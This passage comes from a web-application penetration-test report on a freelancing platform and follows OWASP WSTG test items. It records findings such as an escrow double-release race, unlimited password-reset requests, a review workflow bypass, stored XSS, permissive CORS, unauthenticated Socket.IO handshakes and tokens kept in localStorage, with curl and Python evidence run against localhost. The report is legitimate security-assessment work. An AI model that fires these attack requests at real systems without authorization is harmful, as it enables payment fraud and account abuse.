  > **Description**: `releaseEscrow()` performs balance updates and milestone status changes without a transaction or compare-and-set guard.
  > **Evidence**:
  > ```bash
  > # two concurrent POST /api/payments/escrow/release/<milestoneId>
  > ```
  > Dynamic result: both requests returned `200 OK`; client `pending_balance` dropped from `475719` to `475519`, and freelancer balance rose from `10000000000130457` to `10000000000130637`.
  > **PoC**: `reports/pocs/WSTG-BUSL-04_double-release-race.py`

- [x] WSTG-BUSL-05: Test function usage limits
  > **Finding: Forgot-Password Requests Are Effectively Unlimited**
  > **Severity**: Medium
  > **Source**: `src/middleware/rateLimiter.js:12-19`, `src/auth/auth.routes.js:35-39`
  > **Evidence**:
  > ```bash
  > python3 - <<'PY'
  > import requests
  > print([requests.post('http://localhost:3000/api/auth/forgot-password',
  >   json={'email':'testclient@hireflow.com'}).status_code for _ in range(25)])
  > PY
  > ```
  > All 25 requests returned `200`; the stricter `authLimiter` is defined but not attached to auth routes.
  > **PoC**: `reports/pocs/WSTG-BUSL-05_no-reset-rate-limit.py`

- [x] WSTG-BUSL-06: Test workflow circumvention
  > **Finding: Non-Participants Can Submit Reviews on Arbitrary Contracts**
  > **Severity**: High
  > **Source**: `src/reviews/reviews.service.js:110-159`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Authorization: Bearer <admin-token>' -H 'Content-Type: application/json' \
  >   -d '{"contract_id":"29c1f280-a139-4f25-8b90-1bf2ad2ff068","reviewee_id":"3fcfb3b4-8335-4b13-b813-3d425c3ecf7e","rating":5,"comment":"Admin can review a foreign contract"}' \
  >   http://localhost:3000/api/reviews
  > ```
  > Response excerpt: `201 Created`.
  > **PoC**: `reports/pocs/WSTG-BUSL-06_review-bypass.py`

- [x] WSTG-BUSL-07: Test defenses against application misuse
  > Findings recorded under `WSTG-ATHN-03` and `WSTG-BUSL-05`: login brute-force and forgot-password spam are both weakly defended.
  > **PoC**: `reports/pocs/WSTG-ATHN-03_no-lockout.py`, `reports/pocs/WSTG-BUSL-05_no-reset-rate-limit.py`

- [x] WSTG-BUSL-08: Test upload of unexpected file types
  > Finding recorded under `WSTG-CONF-03`: `.html` deliverables are accepted and stored.
  > **PoC**: `reports/pocs/WSTG-CONF-03_html-upload.py`

- [x] WSTG-BUSL-09: Test upload of malicious files
  > Finding recorded under `WSTG-CONF-03`: uploaded HTML is served as active content from the application origin.
  > **PoC**: `reports/pocs/WSTG-CONF-03_html-upload.py`

- [x] WSTG-BUSL-10: Test payment functionality
  > Findings recorded under `WSTG-BUSL-02`, `WSTG-BUSL-03`, and `WSTG-BUSL-04`: arbitrary release amounts, unsigned wallet credits, and double-release race conditions all impact payment integrity.
  > **PoC**: `reports/pocs/WSTG-BUSL-02_release-override.py`, `reports/pocs/WSTG-ATHN-10_unsigned-webhook.py`, `reports/pocs/WSTG-BUSL-04_double-release-race.py`

---

## CLNT — Client-Side Testing

- [-] WSTG-CLNT-01: Test DOM-based XSS
  > No client-side sink from `location.search`, `location.hash`, or similar browser-controlled values was identified in the React source.

- [x] WSTG-CLNT-03: Test HTML injection
  > Finding recorded under `WSTG-INPV-02`: review comments are rendered with `dangerouslySetInnerHTML`.
  > **PoC**: `reports/pocs/WSTG-INPV-02_stored-review-xss.py`

- [-] WSTG-CLNT-04: Test client-side URL redirect
  > No `redirect`, `next`, or callback-based client redirect sink was present in the frontend routes.

- [x] WSTG-CLNT-07: Test CORS
  > Finding recorded under `WSTG-CONF-08`: arbitrary origins are reflected and credentialed requests are allowed.
  > **PoC**: `reports/pocs/WSTG-SESS-05_csrf-cors.py`

- [-] WSTG-CLNT-09: Test clickjacking
  > `X-Frame-Options: SAMEORIGIN` is present and no missing `frame-ancestors` issue beyond the disabled CSP was required to confirm clickjacking.

- [x] WSTG-CLNT-10: Test WebSockets
  > **Finding: Socket.IO Polling Handshakes Succeed Without Authentication**
  > **Severity**: Medium
  > **Source**: `src/config/socket.js:7-27`, `client/src/utils/socket.js:14-21`
  > **Evidence**:
  > ```bash
  > curl -i -s 'http://localhost:3000/socket.io/?EIO=4&transport=polling&userId=attacker123'
  > curl -i -s 'http://localhost:3000/socket.io/?EIO=4&transport=polling'
  > ```
  > Response excerpts: both returned `200 OK` with a Socket.IO `sid`; the first also returned `Access-Control-Allow-Origin: *`.
  > **PoC**: `reports/pocs/WSTG-CLNT-10_socket-polling.py`

- [x] WSTG-CLNT-12: Test browser storage
  > **Finding: SPA Persists Bearer Tokens in `localStorage`**
  > **Severity**: Medium
  > **Source**: `client/src/api/client.js:4-14`, `client/src/context/AuthContext.jsx:10-17`, `client/src/context/AuthContext.jsx:25-45`
  > **Description**: JWTs are kept in `localStorage` under `hf_token`, increasing impact from any XSS or local compromise.
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"email":"testfreelancer@hireflow.com","password":"password123"}' \
  >   http://localhost:3000/api/auth/login
  > ```
  > Response excerpt: the login response includes a reusable JWT which the SPA stores client-side.
  > **PoC**: `reports/pocs/WSTG-CLNT-12_localstorage-token.py`

- [-] WSTG-CLNT-14: Test reverse tabnabbing
  > Sampled `target="_blank"` links in the frontend use `rel="noopener noreferrer"`.

---

## APIT — API Testing

- [-] WSTG-APIT-01: API reconnaissance
  > Enumerated the full route surface from `src/index.js` and discovered undocumented admin, debug, upload, webhook, and Socket.IO endpoints. No public Swagger/OpenAPI endpoint was exposed.

- [x] WSTG-APIT-02: Test broken object-level authorization (BOLA)
  > Findings recorded under `WSTG-ATHZ-04`: cross-account contracts, proposals, conversations, and user settings are exposed by object identifier.
  > **PoC**: `reports/pocs/WSTG-ATHZ-04_idor-suite.py`

---

## SUPPL — Log Injection & Monitoring (supplementary)

- [-] WSTG-SUPPL-01: Test log injection
  > Login email fields are validated as email addresses before the relevant log call, and no observable log-manipulation effect was confirmed from request input.

- [-] WSTG-SUPPL-02: Test sensitive data in logs
  > Error responses did not echo submitted passwords or full request bodies. Server-side logs were not externally exposed; no direct sensitive-log disclosure was confirmed.
